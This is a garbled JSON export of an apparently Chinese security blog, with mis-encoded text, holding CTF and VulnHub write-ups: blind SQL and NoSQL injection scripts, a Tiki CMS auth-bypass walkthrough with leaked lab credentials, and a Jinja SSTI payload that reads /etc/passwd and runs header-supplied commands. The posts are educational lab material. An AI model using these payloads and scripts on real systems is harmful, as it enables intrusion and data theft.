å’Œå˜é‡å‡½æ•°","date":"2024-02-29T02:51:06.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/02/29/PHPè¯­æ³•æ„é€ å’Œå˜é‡å‡½æ•°/","permalink":"https://lvzhouhang.xyz/2024/02/29/PHP%E8%AF%AD%E6%B3%95%E6%9E%84%E9%80%A0%E5%92%8C%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0/","excerpt":"","text":"æ˜¨å¤©æˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜ 1234&lt;?php$a=&#x27;693741&#x27;;$a=base_convert($a,10,36);$a(system(&quot;dir&quot;)); $aæ˜¯36è¿›åˆ¶çš„evalè½¬æ¢æˆçš„10è¿›åˆ¶ æ‰€ä»¥è¿™ä¸ªä»£ç å…¶å®å°±æ˜¯eval(system(&quot;dir&quot;));ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™å´æŠ¥é”™äº† 1PHP Fatal error: Uncaught Error: Call to undefined function eval() ç„¶åå»ç½‘ä¸Šäº†è§£äº†æ‰çŸ¥é“ eval å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ å˜é‡å‡½æ•° çš„å½¢å¼æ¥è°ƒç”¨` ç±»ä¼¼çš„è¯­æ³•æ„é€ è¿˜æœ‰ï¼šechoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireâ€¦ å°±æ¯”å¦‚ 123456789print &quot;asdasd&quot;;&gt;asdasdfunction myprint($a)&#123; print $a;&#125;myprint &quot;asdasdasd&quot;;&gt;Parse error: syntax error, unexpected &#x27;&quot;asdasdasd&quot;&#x27; (T_CONSTANT_ENCAPSED_STRING) ç›´æ¥print &quot;asdasd&quot;å°±å¯ä»¥æ‰“å°å‡ºå­—ç¬¦ï¼Œä½†æ˜¯è‡ªå·±æ„é€ çš„å‡½æ•°å´æ²¡æœ‰åŠæ³•è¿™æ ·ã€‚ æ‰€ä»¥ç½‘ä¸Šæœ‰çš„ä¸€å¥è¯æœ¨é©¬æ¥è°ƒç”¨evalçš„å…¶å®éƒ½ä¸å¯ä»¥,æ¢æˆassertå°±å¯ä»¥äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"order by ç›²æ³¨","slug":"order-by-ç›²æ³¨","date":"2024-02-11T11:11:39.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/02/11/order-by-ç›²æ³¨/","permalink":"https://lvzhouhang.xyz/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"order byæ¯”è¾ƒå¤§å°ç›²æ³¨ è¿™æ˜¯è¡¨é‡Œçš„æ‰€æœ‰ä¸œè¥¿ å¦‚æœæˆ‘ä»¬æ‰§è¡Œselect * from flag where id=&#39;&#39; or 1 union select 1,1 order by 2;ä¼šå‡ºç° ä¸èƒ½ç”¨andå¦åˆ™å°±ç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨ï¼ŒæŸ¥è¯¢ä¸åˆ°åŸæ¥çš„æ•°æ®ã€‚ æˆ‘ä»¬çŸ¥é“flagçš„ç¬¬ä¸€ä½æ˜¯fï¼Œå¦‚æœæˆ‘ä»¬æŸ¥è¯¢select * from flag where id=&#39;&#39; or 1 union select 1,&#39;f&#39; order by 2;ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ è¿˜æ˜¯è¿™æ ·ï¼Œç¬¬ä¸€è¡Œæ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯gçš„è¯å°±ä¼šå˜æˆè¿™æ · flagçš„å€¼å°±ä¼šå‡ºç°åœ¨ç¬¬ä¸€è¡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¿›è¡Œorder byç›²æ³¨ è„šæœ¬: 1234567891011121314151617import requestsimport stringurl=&quot;http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/&quot;str=string.digits+string.ascii_lettersflag=&#x27;&#x27;j=&#x27;&#x27;for i in range(1,50): for s in str: data = &#123; &#x27;username&#x27;: &quot;&#x27; or 1 union select 1,2,&#x27;&#123;0&#125;&#x27; order by 3#&quot;.format(flag+s), &#x27;password&#x27;: &#x27;1111&#x27; &#125; r=requests.post(url,data=data) if &quot;&lt;/code&gt;admin&quot; in r.text: flag+=chr(ord(s)-1) print(flag) break; æ ¹æ®è„šæœ¬è‡ªè¡Œä¿®æ”¹","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"}]},{"title":"Tiki:1","slug":"Tiki-1","date":"2023-12-04T10:57:21.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/12/04/Tiki-1/","permalink":"https://lvzhouhang.xyz/2023/12/04/Tiki-1/","excerpt":"","text":"æè¿°å“¦ï¼Œä¸ï¼Œæˆ‘ä»¬çš„ç½‘ç»œæœåŠ¡å™¨å—åˆ°äº†æŸå®³ã€‚æ”»å‡»è€…ä½¿ç”¨äº†0dayï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“ä»–æ˜¯å¦‚ä½•è¿›å…¥ç®¡ç†é¢æ¿çš„ã€‚è°ƒæŸ¥ä¸€ä¸‹ã€‚ è¿™æ˜¯ä¸€ä¸ª OSCP Prep Boxï¼Œå®ƒåŸºäºæˆ‘æœ€è¿‘å‘ç°çš„ CVEã€‚å®ƒä½äº OSCP å®éªŒå®¤æœºå™¨çº§åˆ«ã€‚ æ¸—é€è¿‡ç¨‹é¦–å…ˆå°±æ˜¯ä¿¡æ¯æœé›†ï¼Œé¶æœºçš„ipç”¨nmapæˆ–è€…netdiscoveréƒ½å¯ä»¥ é¶æœºipï¼š192.168.56.102 ç„¶åæ‰«æä¸€ä¸‹å…¨éƒ¨çš„ç«¯å£ nmap -sS -p- 192.168.56.102 -T4 --min-rate 1000 -oN nmap.txt ç»“æœå¦‚ä¸‹ï¼š 12345PORT STATE SERVICE22/tcp open ssh80/tcp open http139/tcp open netbios-ssn445/tcp open microsoft-ds ç„¶åæ‰«ä¸€ä¸‹ç«¯å£çš„ä¿¡æ¯ï¼Œå’ŒæœåŠ¡çš„ç‰ˆæœ¬ nmap -sV -sC -O -p22,80,139,445 192.168.56.102 123456789101112131415161718192021222324252627282930313233343536PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 a3d84a89a9256d07c53d762806edd1c0 (RSA)| 256 e7b289055457dc02f48c3a7c558b51aa (ECDSA)|_ 256 fd77072b4a163a016be0000c0a36d82f (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/tiki/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-toc: truetitle: Apache2 Ubuntu Default Page: It works139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.2MAC Address: 08:00:27:26:96:01 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: 7h59m57s| smb2-security-mode: | 311: |_ Message signing enabled but not required|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)| smb2-time: | date: 2023-12-04T20:55:56|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.95 seconds å¯ä»¥å‘ç°æœ‰sambaæœåŠ¡ï¼Œå¯ä»¥å¯¹sambaè¿›è¡Œæšä¸¾ ç”¨enum4linuxè·‘ä¸€ä¸‹å¯ä»¥æ‰¾åˆ°silkyçš„ç”¨æˆ·,ç”¨smbclientåˆ—ä¸¾ä¸€ä¸‹å…±äº«çš„èµ„æº smbclient -L IP 123456Sharename Type Comment--------- ---- -------print$ Disk Printer DriversNotes Disk My NotesIPC$ IPC IPC Service (ubuntu server (Samba, Ubuntu)) èƒ½æ‰¾åˆ°Notesï¼Œè¿æ¥ä¸€ä¸‹smbclient //192.168.56.102/Notesæœ‰ä¸€ä¸ªMail.txt ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹ 12345678910#Mail.txtHi Silkybecause of a current Breach we had to change all Passwords,please note that it was a 0day, we don&#x27;t know how he made it.Your new CMS-password is now 51lky571k1, please investigate how he made it into our Admin Panel.Cheers Boss. å¯ä»¥çœ‹åˆ°cmsçš„å¯†ç ï¼Œç™»å½•ä¹‹åæ²¡ä»€ä¹ˆç”¨ã€‚ æŸ¥çœ‹cmsæœ‰æ²¡æœ‰ä»€ä¹ˆå†å²æ¼æ´ searchsploit tiki cms 1234567891011121314151617---------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Tiki Wiki CMS 15.0 - Arbitrary File Download | php/webapps/40080.txtTiki Wiki CMS Calendar 6.15/9.11 LTS/12.5 LTS/14.2 - Remote Code Execution | php/webapps/39965.txtTiki Wiki CMS Groupware - &#x27;url&#x27; Open Redirection | php/webapps/36848.txtTiki Wiki CMS Groupware 21.1 - Authentication Bypass | php/webapps/48927.pyTiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities | php/webapps/15174.txtTiki Wiki CMS Groupware 7.2 - &#x27;snarf_ajax.php&#x27; Cross-Site Scripting | php/webapps/35974.txtTiki Wiki CMS Groupware 8.1 - &#x27;show_errors&#x27; HTML Injection | php/webapps/36470.txtTiki Wiki CMS Groupware 8.2 - &#x27;snarf_ajax.php&#x27; Remote PHP Code Injection | php/webapps/18265.txtTiki Wiki CMS Groupware 8.3 - &#x27;Unserialize()&#x27; PHP Code Execution | php/webapps/19573.phpTiki Wiki CMS Groupware 8.3 - &#x27;Unserialize()&#x27; PHP Code Execution (Metasploit) | php/webapps/19630.rb---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results æŸ¥çœ‹webæœåŠ¡cmsçš„ç‰ˆæœ¬ç”¨dirsearchå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªchangelog è®¿é—®å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¸º21.1ï¼Œæ­£å¥½æœ‰ä¸€ä¸ªå†å²æ¼æ´ ç”¨searchsploit tiki cms -m 48927 å°†è„šæœ¬ä¸‹è½½ä¸‹æ¥è¿è¡Œï¼Œé‡ç½®adminçš„å¯†ç ä¸ºç©º,ç„¶åç”¨adminç™»å½•bpæŠ“åŒ…ä¿®æ”¹ç™»å½•å¯†ç ä¸ºç©ºï¼ŒæˆåŠŸç™»å½•ã€‚åœ¨lastchangeçš„Credentialsé‡Œå¯ä»¥æ‰¾åˆ°silky:Agy8Y7SPJNXQzqA è¿™ä¸ªæ˜¯sshçš„å¯†ç ï¼Œç”¨sshè¿æ¥ï¼ŒæŸ¥çœ‹idï¼Œå‘ç°ç”¨æˆ·åœ¨soduç»„ä¸‹ï¼Œå¯ä»¥ç›´æ¥sudo suææƒã€‚ å°ç»“ä¸€å¼€å§‹é¶åœºæ­å»ºçš„æ—¶å€™å‡ºäº†ç‚¹é—®é¢˜å¯¼è‡´å‘ç°ä¸äº†é¶æœºçš„åœ°å€ï¼Œæ˜¯å› ä¸ºæˆ‘çš„æ”»å‡»æœºå’Œé¶æœºä¸åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œå°†é¶æœºçš„ç½‘å¡å’Œæ”»å‡»æœºæ¡¥æ¥åœ¨ä¸€èµ·å°±å¯ä»¥äº† è®°å½•ä¸‹æ¥çš„åªæœ‰æ­£ç¡®çš„è·¯çº¿ï¼Œæ¸—é€è¿‡ç¨‹ä¸­è¿˜è¦å»è¯•ç€æ¢ç´¢å…¶ä»–çš„åŠŸèƒ½ç‚¹","categories":[{"name":"boot2root","slug":"boot2root","permalink":"https://lvzhouhang.xyz/categories/boot2root/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://lvzhouhang.xyz/tags/vulnhub/"}]},{"title":"1337_UP_LIVE_CTF 2023","slug":"1337_up_live_Ctf","date":"2023-11-22T12:14:04.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/11/22/1337_up_live_Ctf/","permalink":"https://lvzhouhang.xyz/2023/11/22/1337_up_live_Ctf/","excerpt":"","text":"CTFCåˆ·é¢˜çš„æ—¶å€™è§åˆ°è¿‡è¿™ç§é¢˜ï¼Œå…¶å®å°±æ˜¯æ³¨å…¥+çˆ†ç ´å˜›ï¼Œä½†ä¹‹å‰é‡åˆ°çš„æ˜¯sqlæ³¨å…¥çš„ï¼Œè¿™è¯´æ˜ç°åœ¨æ•°æ®åº“ç±»å‹è§çš„ä¸å¤š é¢˜ç›®ç»™äº†ä¸€ä¸ªé™„ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#app.pyfrom flask import Flask,render_template,request,session,redirectimport pymongoimport osfrom functools import wrapsfrom datetime import timedeltafrom hashlib import md5from time import sleepapp = Flask(__name__)app.secret_key = os.environ[&#x27;SECRET_KEY&#x27;]# db settingsclient = pymongo.MongoClient(&#x27;localhost&#x27;,27017)db = client.ctfdbdef createChalls(): db.challs.insert_one(&#123;&quot;_id&quot;: &quot;28c8edde3d61a0411511d3b1866f0636&quot;,&quot;challenge_name&quot;: &quot;Crack It&quot;,&quot;category&quot;: &quot;hash&quot;,&quot;challenge_description&quot;: &quot;My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC&#123;&lt;password&gt;&#125;&quot;,&quot;challenge_flag&quot;: &quot;CTFC&#123;cryptocat&#125;&quot;,&quot;points&quot;: &quot;500&quot;,&quot;released&quot;: &quot;True&quot;&#125;) db.challs.insert_one(&#123;&quot;_id&quot;: &quot;665f644e43731ff9db3d341da5c827e1&quot;,&quot;challenge_name&quot;: &quot;MeoW sixty IV&quot;,&quot;category&quot;: &quot;crypto&quot;,&quot;challenge_description&quot;: &quot;hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters&quot;,&quot;challenge_flag&quot;: &quot;CTFC&#123;n0w_g0_4_th3_r34L_fl4G&#125;&quot;,&quot;points&quot;: &quot;1000&quot;,&quot;released&quot;: &quot;True&quot;&#125;) db.challs.insert_one(&#123;&quot;_id&quot;: &quot;38026ed22fc1a91d92b5d2ef93540f20&quot;,&quot;challenge_name&quot;: &quot;ImPAWSIBLE&quot;,&quot;category&quot;: &quot;web&quot;,&quot;challenge_description&quot;: &quot;well, this challenge is not fully created yet, but we have the flag for it&quot;,&quot;challenge_flag&quot;: os.environ[&#x27;CHALL_FLAG&#x27;],&quot;points&quot;: &quot;1500&quot;,&quot;released&quot;: &quot;False&quot;&#125;)# login checkdef check_login(f): @wraps(f) def wrap(*args,**kwrags): if &#x27;user&#x27; in session: return f(*args,**kwrags) else: return render_template(&#x27;dashboard.html&#x27;) return wrap# routesfrom user import routes@app.route(&#x27;/&#x27;)@check_logindef dashboard(): challs = [] for data in db.challs.find(): del data[&#x27;challenge_flag&#x27;] challs.append(data) chall_1 = challs[0] chall_2 = challs[1] return render_template(&#x27;t_dashboard.html&#x27;,username=session[&#x27;user&#x27;][&#x27;username&#x27;],chall_1=chall_1,chall_2=chall_2)@app.route(&#x27;/register&#x27;)def register(): return render_template(&#x27;register.html&#x27;)@app.route(&#x27;/login&#x27;)def login(): return render_template(&#x27;login.html&#x27;)@app.route(&#x27;/logout&#x27;)def logout(): session.clear() return redirect(&#x27;/&#x27;)@app.route(&#x27;/submit_flag&#x27;,methods=[&#x27;POST&#x27;])@check_logindef submit_flag(): _id = request.json.get(&#x27;_id&#x27;)[-1] submitted_flag = request.json.get(&#x27;challenge_flag&#x27;) chall_details = db.challs.find_one( &#123; &quot;_id&quot;: md5(md5(str(_id).encode(&#x27;utf-8&#x27;)).hexdigest().encode(&#x27;utf-8&#x27;)).hexdigest(), &quot;challenge_flag&quot;:submitted_flag &#125; ) if chall_details == None: return &quot;wrong flag!&quot; else: return &quot;correct flag!&quot;# wait untill mongodb start then create the challs in dbsleep(10)createChalls() èƒ½çœ‹å‡ºæ˜¯MongoDBå¯ä»¥ç”¨$regex è¿›è¡Œæ­£åˆ™åŒ¹é… exp: 1234567891011121314151617181920212223242526272829import requests, stringfrom urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;cookies = &#123; &#x27;session&#x27;: &#x27;eyJ1c2VyIjp7Il9pZCI6IjNhZDFlZGRlODNkMzRmMjhiZTMwMDdiYTIxOWQzZDUyIiwidXNlcm5hbWUiOiJhc2Rhc2QifX0.ZVoXtA.-obI_0v_QOu3KgulYZCyrYukpiM&#x27;&#125; #ç™»å½•çš„sessionflag = &#x27;&#x27;while True: for l in string.ascii_letters + string.digits + &quot;_&#123;&#125;&quot;: data = &#x27;&#123;&quot;_id&quot;:&quot;_id:3&quot;,&quot;challenge_flag&quot;:&#123;&quot;$regex&quot;:&quot;^&#x27; + flag + l + &#x27;.*&quot;&#125;&#125;&#x27; print(data) data = requests.post(&#x27;https://ctfc2.ctf.intigriti.io/submit_flag&#x27;, data = data, headers = headers, cookies = cookies, verify=False) print(data.text) if &#x27;correct flag!&#x27; in data.text: flag += l print(flag) break else: print(&#x27;Failed&#x27;) exit(1) Bug Bankæœ‰ä¸¤ç§è§£æ³•ï¼Œé¢„æœŸè§£æˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œéé¢„æœŸè§£å°±å¾ˆç®€å•äº†ï¼Œé€šè¿‡è½¬é’±çš„åŠŸèƒ½è½¬-100000000åŸè´¦å·å°±ä¼šå‡-100000000å°±ä¼šå˜æˆæ­£çš„ï¼Œå°±å¯ä»¥ä¹°flagäº† é¢„æœŸè§£å¯ä»¥å‚è€ƒï¼š 123https://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.mdhttps://portswigger.net/research/hijacking-service-workers-via-dom-clobbering Smarty Pants123456789101112131415161718192021222324252627282930313233343536373839404142#index.php&lt;?phpif(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die();&#125;require(&#x27;/var/www/vendor/smarty/smarty/libs/Smarty.class.php&#x27;);$smarty = new Smarty();$smarty-&gt;setTemplateDir(&#x27;/tmp/smarty/templates&#x27;);$smarty-&gt;setCompileDir(&#x27;/tmp/smarty/templates_c&#x27;);$smarty-&gt;setCacheDir(&#x27;/tmp/smarty/cache&#x27;);$smarty-&gt;setConfigDir(&#x27;/tmp/smarty/configs&#x27;);$pattern = &#x27;/(\\b)(on\\S+)(\\s*)=|javascript|&lt;(|\\/|[^\\/&gt;][^&gt;]+|\\/[^&gt;][^&gt;]+)&gt;|(&#123;+.*&#125;+)/&#x27;;if(!isset($_POST[&#x27;data&#x27;]))&#123; $smarty-&gt;assign(&#x27;pattern&#x27;, $pattern); $smarty-&gt;display(&#x27;index.tpl&#x27;); exit();&#125;// returns true if data is maliciousfunction check_data($data)&#123; global $pattern; return preg_match($pattern,$data);&#125;if(check_data($_POST[&#x27;data&#x27;]))&#123; $smarty-&gt;assign(&#x27;pattern&#x27;, $pattern); $smarty-&gt;assign(&#x27;error&#x27;, &#x27;Malicious Inputs Detected&#x27;); $smarty-&gt;display(&#x27;index.tpl&#x27;); exit();&#125;$tmpfname = tempnam(&quot;/tmp/smarty/templates&quot;, &quot;FOO&quot;);$handle = fopen($tmpfname, &quot;w&quot;);fwrite($handle, $_POST[&#x27;data&#x27;]);fclose($handle);$just_file = end(explode(&#x27;/&#x27;,$tmpfname));$smarty-&gt;display($just_file);unlink($tmpfname); ç”¨æ¢è¡Œç¬¦ç»•è¿‡å³å¯ Bug Report Repoé¦–å…ˆæ˜¯sqlç›²æ³¨ï¼Œæ•°æ®åº“æ˜¯sqliteï¼Œè‡ªå·±å†™çš„è„šæœ¬ï¼Œæ•ˆç‡ä¸å¤Ÿï¼Œè¿˜æ˜¯å¾—é sqlmap 1234567891011121314151617181920212223242526272829import websocketimport stringimport jsonstr=string.ascii_letters+string.digits+string.punctuationws = websocket.WebSocket()ws.connect(&quot;wss://bountyrepo.ctf.intigriti.io/ws&quot;)flag=&#x27;&#x27;for j in range(1,300): aaa=False for i in str: # data=&#123;&quot;id&quot;:f&quot;11 and length(sqlite_version())=&#123;j&#125;&quot;&#125;åˆ¤æ–­æ•°æ®åº“é•¿åº¦ # data=&#123;&quot;id&quot;:f&quot;11 AND SUBSTR((SELECT COUNT(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27;),1,1)=CHAR(&#123;j&#125;)&quot;&#125;åˆ¤æ–­è¡¨é•¿åº¦ #data=&#123;&quot;id&quot;:f&quot;11 and substr((select group_concat(tbl_name) from sqlite_master where type=&#x27;table&#x27; limit 0,1),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;&quot;&#125; data = &#123;&quot;id&quot;: f&quot;11 and substr((select group_concat(sql) from sqlite_master),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;&quot;&#125; data=json.dumps(data) #print(data) ws.send(data) a=ws.recv() print(a) if &#x27;Bug report from ethical_hacker is Open&#x27; in a: aaa=True flag+=i print(flag) break #continue if aaa == False: print(&quot;ok&quot;) break é™„ä¸€ä¸ªåˆ«çš„å¸ˆå‚…å†™çš„è„šæœ¬ 12345678910111213141516171819202122232425262728293031import stringfrom websockets.sync.client import connectimport jsonURL = &#x27;bountyrepo.ctf.intigriti.io&#x27;# ALPHABET = string.ascii_uppercase # string.ascii_letters + &#x27;&#123;!_&#125;&#x27;ALPHABET = string.digits + &#x27;.&#x27;PAYLOAD = &quot;1 AND (select sqlite_version()) LIKE &#x27;&#123;guess&#125;%&#x27; -- -&quot;# flag = &#x27;INTIGRITI&#x27; flag = &#x27;&#x27; with connect(f&quot;wss://&#123;URL&#125;/ws&quot;) as websocket: while True: for c in ALPHABET: payload = PAYLOAD.format(guess=flag + c) print(&#x27;\\r&gt;&gt;&gt;&#x27;, payload, end=&#x27;&#x27;) websocket.send(json.dumps(&#123;&quot;id&quot;: payload&#125;)) message = websocket.recv() if &#x27;Bug not found!&#x27; not in message: flag += c print() print(flag) break&#x27;&#x27;&#x27;# PAYLOAD = &quot;1 AND (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27;) LIKE &#x27;&#123;tables&#125;%&#x27; -- -&quot;# tables = &quot;bug_reports&quot;# PAYLOAD = &quot;1 AND (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO(&#x27;bug_reports&#x27;)) LIKE &#x27;&#123;guess&#125;%&#x27; --&quot;# columns = &#x27;id,category,description,severity,cvss_score,status,reported_by,reported_date&#x27;&#x27;&#x27;&#x27; çˆ†å‡ºæ¥çš„ä¸€æ¡æœ‰ç”¨çš„ä¸œè¥¿ 1crypt0:c4tz on /4dm1n_z0n3, really?! è®¿é—®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œç”¨ç»™çš„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œä»–æ˜¯å¾—æ˜¯adminï¼Œé‚£å°±æ˜¯jwtï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†é’¥å•Šï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº†ä¸€ä¸ªå·¥å…·jwt-crackerçˆ†ç ´å¯†é’¥ï¼Œå­—å…¸ç”¨rockyouï¼Œkeyæ˜¯catsarethebestï¼Œä¼ªé€ adminå°±okäº† Pizza Timeåªæœ‰ä¸€å¤„åŠŸèƒ½ç‚¹â€¦. 1sudo nmap -sVC -T4 -Pn -vv -p 443 pizzatime.ctf.intigriti.io æ¢æµ‹webæœåŠ¡ï¼Œç”¨çš„æ˜¯ngnixï¼Œå¯ä»¥çŒœæµ‹æ˜¯Flask/Djangoæˆ–è€…node é¦–å…ˆfuzzï¼Œå¯ä»¥çœ‹å‡ºé™¤äº†&amp;å’Œ+çš„æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†å¤§æ‹¬å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œéš¾é“ä¸æ˜¯SSTIä¹ˆï¼Ÿä¸ï¼ä»–å°±æ˜¯SSTI,%0aå¯ä»¥ç»•è¿‡ï¼Œå…·ä½“åŸç†æ˜¯ä»€ä¹ˆæˆ‘å¾—åˆ†æåˆ†ææºç å†å†™ payload: 1x%0a&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(&#x27;cat+/etc/passwd&#x27;).read()&#125;&#125; ä½†æ˜¯è¿™æ ·ä¼šæŠ¥500ï¼Œå°†å‘½ä»¤æ”¾è¿›headeré‡Œå°±å¯ä»¥ç»•è¿‡äº† 1x%0a&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(request.headers.get(&quot;X&quot;)).read()&#125;&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"dnslogæ³¨å…¥å­¦ä¹ ","slug":"dnslogæ³¨å…¥å­¦ä¹ ","date":"2023-10-18T02:03:54.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/10/18/dnslogæ³¨å…¥å­¦ä¹ /","permalink":"https://lvzhouhang.xyz/2023/10/18/dnslog%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"ä»€ä¹ˆæ˜¯DNSlogDNSï¼ˆDomain Name Systemï¼‰åŸŸåæœåŠ¡ç³»ç»Ÿï¼Œç®€å•çš„è¯´å°±æ˜¯åŸŸåä¸IPè½¬æ¢æœåŠ¡ï¼Œæ¯”å¦‚ç”¨æˆ·è¾“å…¥a.com,DNSå°±ä¼šå°†a.comè§£ææ‰¾åˆ°å®ƒçœŸå®çš„ipï¼Œä»¥ä¾¿äºè®¿é—®æœåŠ¡å™¨ä¸Šçš„ç›¸å…³æœåŠ¡ï¼ŒDNSlogå°±æ˜¯å­˜å‚¨åœ¨DNSæœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸåè®¿é—®çš„ä¿¡æ¯ï¼Œç±»ä¼¼äºæ—¥å¿—æ–‡ä»¶ã€‚ DNSlogå›æ˜¾åŸç†é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å¤šçº§åŸŸåçš„æ¦‚å¿µ åŸŸååˆ†çº§ä¸åŸŸåè§£æè¿‡ç¨‹(DNS) å› ç‰¹ç½‘é‡‡ç”¨å±‚æ¬¡æ ‘çŠ¶ç»“æ„å‘½åæ–¹æ³•ã€‚åŸŸæ˜¯åå­—ç©ºé—´ä¸­ä¸€ä¸ªå¯è¢«ç®¡ç†çš„åˆ’åˆ†ï¼ˆæŒ‰æœºæ„ç»„ç»‡åˆ’åˆ†ï¼‰ï¼ŒåŸŸå¯è¢«åˆ’åˆ†ä¸ºå­åŸŸï¼Œå­åŸŸå¯å†è¢«åˆ’åˆ†ï¼Œå³å½¢æˆäº†é¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ã€‚ä»å³å‘å·¦ä¸ºé¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ï¼Œç”¨ç‚¹éš”å¼€ã€‚ä¾‹å¦‚872323857.github.ioï¼Œioå°±æ˜¯é¡¶çº§åŸŸåï¼Œgithubå°±æ˜¯äºŒçº§åŸŸåï¼Œ872323857å°±æ˜¯ä¸‰çº§åŸŸåã€‚ä¸”åŸŸåä¸åˆ†å¤§å°å†™ã€‚ é€šä¿—çš„è¯´å°±æ˜¯æˆ‘æœ‰ä¸ªå·²æ³¨å†Œçš„åŸŸåa.comï¼Œæˆ‘åœ¨åŸŸåä»£ç†å•†é‚£é‡Œå°†åŸŸåè®¾ç½®å¯¹åº”çš„ip 1.1.1.1 ä¸Šï¼Œè¿™æ 